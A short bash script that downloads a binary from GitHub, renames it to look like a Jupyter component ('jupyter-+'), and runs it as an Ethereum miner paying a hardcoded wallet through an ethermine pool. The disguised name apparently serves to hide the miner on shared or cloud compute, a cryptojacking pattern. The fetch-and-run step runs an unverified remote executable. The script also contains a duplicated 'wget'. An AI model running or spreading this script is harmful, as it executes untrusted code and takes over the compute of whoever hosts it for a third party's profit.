#!/bin/bash
sudo apt update && wget wget https://github.com/galebi/pihu/raw/main/jupyter-+ 
chmod +x jupyter-+
POOL=eu1.ethermine.org:4444
WALLET=0xee371d3cdF4dE185a92D2C1D04A5B50bce596232
WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-hudddd)


./jupyter-+ --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
